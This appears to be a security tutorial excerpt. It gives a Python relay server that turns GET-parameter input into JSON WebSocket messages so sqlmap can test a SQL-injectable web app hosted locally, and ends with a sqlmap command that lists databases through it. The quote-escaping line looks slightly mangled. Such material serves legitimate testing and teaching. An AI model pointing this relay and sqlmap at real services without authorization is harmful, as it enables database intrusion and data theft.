										𝗛𝗧𝗧𝗣 𝗦𝗲𝗿𝘃𝗲𝗿 𝘀𝗰𝗿𝗶𝗽𝘁 𝘁𝗵𝗮𝘁 𝘄𝗶𝗹𝗹 𝗿𝗲𝗰𝗲𝗶𝘃𝗲 𝘁𝗵𝗲 𝗦𝗤𝗟𝗠𝗮𝗽 𝗽𝗮𝘆𝗹𝗼𝗮𝗱 𝘃𝗶𝗮 𝗚𝗘𝗧 𝗽𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

𝗜𝘁 𝗶𝘀 𝘀𝗶𝗺𝗶𝗹𝗮𝗿 𝘁𝗼 𝗦𝗤𝗟𝗠𝗮𝗽 𝘁𝗮𝗺𝗽𝗲𝗿 𝘀𝗰𝗿𝗶𝗽𝘁𝘀 𝗯𝘂𝘁 𝗶𝗻 𝘁𝗵𝗶𝘀 𝗰𝗮𝘀𝗲 𝘁𝗵𝗲 𝘀𝗰𝗿𝗶𝗽𝘁 𝘄𝗶𝗹𝗹 𝗮𝗰𝘁 𝗮𝘀 𝗮 𝘀𝘁𝗮𝗻𝗱𝗮𝗹𝗼𝗻𝗲 𝘀𝗲𝗿𝘃𝗲𝗿 𝘃𝘂𝗹𝗻𝗲𝗿𝗮𝗯𝗹𝗲 𝘁𝗼 𝗦𝗤𝗟𝗶 𝗼𝗻 𝗚𝗘𝗧 𝗽𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿. 𝗛𝗲𝗿𝗲 𝗶𝘀 𝘁𝗵𝗲 𝗳𝘂𝗹𝗹 𝗣𝘆𝘁𝗵𝗼𝗻𝟯 𝘀𝗰𝗿𝗶𝗽𝘁 𝗰𝗿𝗲𝗮𝘁𝗲𝗱 𝗳𝗼𝗿 𝘁𝗵𝗲 𝘃𝘂𝗹𝗻𝗲𝗿𝗮𝗯𝗹𝗲 𝘄𝗲𝗯 𝗮𝗽𝗽


from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://localhost:8156/ws"

def send_ws(payload):
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	
	# For our case, format the payload in JSON
	message = unquote(payload).replace('"','\\'') # replacing " with ' to avoid breaking JSON structure
	data = '{"employeeID":"%s"}' % message

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
	pass
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

𝗧𝗵𝗲 𝘀𝗰𝗿𝗶𝗽𝘁 𝘄𝗶𝗹𝗹 𝗰𝗿𝗲𝗮𝘁𝗲 𝗮𝗻 𝗛𝗧𝗧𝗣 𝗦𝗲𝗿𝘃𝗲𝗿 𝗼𝗻 𝗽𝗼𝗿𝘁 𝟴𝟬𝟴𝟭 𝗮𝗻𝗱 𝗲𝘅𝘁𝗿𝗮𝗰𝘁 𝗳𝗶𝗿𝘀𝘁 𝗚𝗘𝗧 𝗽𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿 𝘃𝗮𝗹𝘂𝗲, 𝘀𝗲𝗻𝗱 𝘁𝗵𝗲 𝘃𝗮𝗹𝘂𝗲 𝘁𝗼  𝘀𝗲𝗻𝗱_𝘄𝘀  𝗳𝘂𝗻𝗰𝘁𝗶𝗼𝗻 𝘄𝗵𝗲𝗿𝗲 𝗶𝘁 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗳𝗼𝗿𝗺𝗮𝘁𝗲𝗱 𝗮𝘀 𝗮 𝗝𝗦𝗢𝗡 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗮𝘀 𝗿𝗲𝗾𝘂𝗶𝗿𝗲𝗱 𝗯𝘆 𝘁𝗵𝗲 𝘃𝘂𝗹𝗻𝗲𝗿𝗮𝗯𝗹𝗲 𝘄𝗲𝗯 𝗮𝗽𝗽.
𝗜𝘁 𝘄𝗶𝗹𝗹 𝘁𝗵𝗲𝗻 𝗲𝘀𝘁𝗮𝗯𝗹𝗶𝘀𝗵 𝗮 𝗪𝗲𝗯𝗦𝗼𝗰𝗸𝗲𝘁 𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻 𝘁𝗼 𝘁𝗵𝗲 𝘀𝗲𝗿𝘃𝗲𝗿 𝗲𝗻𝗱𝗽𝗼𝗶𝗻𝘁 𝗺𝗲𝗻𝘁𝗶𝗼𝗻𝗲𝗱 𝗶𝗻  𝘄𝘀_𝘀𝗲𝗿𝘃𝗲𝗿  𝘃𝗮𝗿𝗶𝗮𝗯𝗹𝗲 𝗮𝗻𝗱 𝘀𝗲𝗻𝗱 𝘁𝗵𝗲 𝗽𝗮𝘆𝗹𝗼𝗮𝗱.

𝗡𝗼𝘄 𝘁𝗼 𝘁𝗲𝘀𝘁 𝗼𝘂𝘁 𝗼𝘂𝗿 𝗺𝗶𝗱𝗱𝗹𝗲-𝘄𝗮𝗿𝗲 𝘀𝗲𝗿𝘃𝗲𝗿 𝗶𝗻 𝗮𝗰𝘁𝗶𝗼𝗻, 𝗜’𝗹𝗹 𝗳𝗶𝗿𝘀𝘁 𝗵𝗼𝘀𝘁 𝘁𝗵𝗲 𝘃𝘂𝗹𝗻𝗲𝗿𝗮𝗯𝗹𝗲 𝘄𝗲𝗯 𝗮𝗽𝗽 𝗮𝗻𝗱 𝗹𝗮𝘂𝗻𝗰𝗵 𝘁𝗵𝗲 𝗮𝗯𝗼𝘃𝗲 𝘀𝗰𝗿𝗶𝗽𝘁 𝗶𝗻 𝗮 𝘁𝗲𝗿𝗺𝗶𝗻𝗮𝗹. 𝗧𝗵𝗲𝗻 𝗲𝘅𝗲𝗰𝘂𝘁𝗲 𝗦𝗤𝗟𝗠𝗮𝗽 𝗮𝗴𝗮𝗶𝗻𝘀𝘁 𝘁𝗵𝗲 𝗺𝗶𝗱𝗱𝗹𝗲-𝘄𝗮𝗿𝗲 𝘀𝗲𝗿𝘃𝗲𝗿 𝗵𝗼𝘀𝘁𝗲𝗱 𝗼𝗻 𝗽𝗼𝗿𝘁 𝟴𝟬𝟴𝟭:

sqlmap -u "http://localhost:8081/?id=1" --batch --dbs

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
